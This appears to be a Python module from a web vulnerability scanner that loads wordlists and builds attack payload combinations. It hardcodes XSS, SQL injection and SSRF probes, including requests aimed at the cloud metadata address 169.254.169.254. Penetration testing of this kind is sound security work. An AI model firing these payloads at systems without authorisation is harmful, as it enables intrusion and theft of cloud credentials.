"""
Wordlist Integration Module
Integrates AyushXtha/wordlist resources into the scanner
"""
import os
from pathlib import Path
from typing import List, Dict

class WordlistManager:
    """Manages loading and providing wordlists for scanning"""
    
    def __init__(self):
        self.wordlists = {}
        self.load_all_wordlists()
    
    def load_all_wordlists(self):
        """Load all available wordlists"""
        wordlist_sources = {
            'ports': '/tmp/ports.txt',
            'parameters': '/tmp/parameters.txt',
            'nosql': '/tmp/nosql.txt',
            'lfi': '/tmp/LFI_payloads.txt',
            'redirect': '/tmp/redirect.txt',
            'jwt': '/tmp/jwt',
            'lesredirect': '/tmp/lesredirect.txt',
        }
        
        for name, filepath in wordlist_sources.items():
            self.wordlists[name] = self._load_file(filepath)
    
    @staticmethod
    def _load_file(filepath: str) -> List[str]:
        """Load wordlist from file"""
        if not os.path.exists(filepath):
            return []
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Error loading {filepath}: {e}")
            return []
    
    def get_ports(self, limit: int = None) -> List[int]:
        """Get ports list"""
        ports = [int(p) for p in self.wordlists.get('ports', []) if p.isdigit()]
        if limit:
            return sorted(ports)[:limit]
        return sorted(ports)
    
    def get_parameters(self) -> List[str]:
        """Get parameters wordlist"""
        return self.wordlists.get('parameters', [])
    
    def get_nosql_payloads(self) -> List[str]:
        """Get NoSQL injection payloads"""
        return self.wordlists.get('nosql', [])
    
    def get_lfi_payloads(self) -> List[str]:
        """Get LFI payloads"""
        return self.wordlists.get('lfi', [])
    
    def get_redirect_payloads(self) -> List[str]:
        """Get open redirect payloads"""
        return self.wordlists.get('redirect', [])
    
    def get_jwt_patterns(self) -> List[str]:
        """Get JWT patterns"""
        return self.wordlists.get('jwt', [])
    
    def get_lesredirect_payloads(self) -> List[str]:
        """Get LES redirect payloads"""
        return self.wordlists.get('lesredirect', [])
    
    def get_ssrf_with_ports(self) -> List[str]:
        """Generate SSRF payloads with all available ports"""
        payloads = []
        ports = self.get_ports(limit=100)  # Use top 100 ports for efficiency
        hosts = ['localhost', '127.0.0.1', '0.0.0.0', '169.254.169.254']
        
        for host in hosts:
            for port in ports:
                payloads.extend([
                    f'http://{host}:{port}',
                    f'https://{host}:{port}',
                ])
        
        return payloads
    
    def get_stats(self) -> Dict[str, int]:
        """Get statistics about loaded wordlists"""
        return {
            'ports': len(self.wordlists.get('ports', [])),
            'parameters': len(self.wordlists.get('parameters', [])),
            'nosql': len(self.wordlists.get('nosql', [])),
            'lfi': len(self.wordlists.get('lfi', [])),
            'redirect': len(self.wordlists.get('redirect', [])),
            'jwt': len(self.wordlists.get('jwt', [])),
            'lesredirect': len(self.wordlists.get('lesredirect', [])),
        }
    
    def print_stats(self):
        """Print wordlist statistics"""
        stats = self.get_stats()
        total = sum(stats.values())
        print("[=] Wordlist Integration Summary [=]")
        print(f"Total resources: {total}")
        for name, count in stats.items():
            print(f"  • {name.upper():15} {count:6} items")


class PayloadGenerator:
    """Generates attack payloads from wordlists"""
    
    def __init__(self, wordlist_manager: WordlistManager):
        self.wl_mgr = wordlist_manager
    
    def generate_xss_combinations(self) -> List[tuple]:
        """Generate XSS parameter combinations"""
        parameters = self.wl_mgr.get_parameters()[:50]  # Top 50 params
        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '"><svg onload=alert(1)>',
            '" onmouseover="alert(1)',
            '<img src=x onerror="alert(1)">',
        ]
        
        combinations = []
        for param in parameters:
            for payload in xss_payloads:
                combinations.append((param, payload))
        
        return combinations
    
    def generate_sqli_combinations(self) -> List[tuple]:
        """Generate SQLi parameter combinations"""
        parameters = self.wl_mgr.get_parameters()[:50]
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1 -- -",
            "admin' -- -",
            "' UNION SELECT NULL -- -",
        ]
        
        combinations = []
        for param in parameters:
            for payload in sqli_payloads:
                combinations.append((param, payload))
        
        return combinations
    
    def generate_ssrf_combinations(self) -> List[tuple]:
        """Generate SSRF parameter combinations"""
        parameters = ['url', 'redirect', 'image_url', 'fetch_url', 'download', 'next']
        ssrf_payloads = self.wl_mgr.get_ssrf_with_ports()[:50]
        
        combinations = []
        for param in parameters:
            for payload in ssrf_payloads:
                combinations.append((param, payload))
        
        return combinations


# Global instance
_wordlist_manager = None

def get_wordlist_manager() -> WordlistManager:
    """Get or create global wordlist manager"""
    global _wordlist_manager
    if _wordlist_manager is None:
        _wordlist_manager = WordlistManager()
    return _wordlist_manager


def get_payload_generator() -> PayloadGenerator:
    """Get payload generator"""
    wl_mgr = get_wordlist_manager()
    return PayloadGenerator(wl_mgr)


if __name__ == "__main__":
    # Test integration
    print("[*] Testing Wordlist Integration...")
    
    wl_mgr = get_wordlist_manager()
    wl_mgr.print_stats()
    
    print("\n[*] Sample SSRF payloads:")
    ssrf = wl_mgr.get_ssrf_with_ports()[:5]
    for payload in ssrf:
        print(f"  • {payload}")
    
    print("\n[*] Sample parameters:")
    params = wl_mgr.get_parameters()[:10]
    for param in params:
        print(f"  • {param}")
    
    print("\n[*] Sample NoSQL payloads:")
    nosql = wl_mgr.get_nosql_payloads()[:5]
    for payload in nosql:
        print(f"  • {payload}")
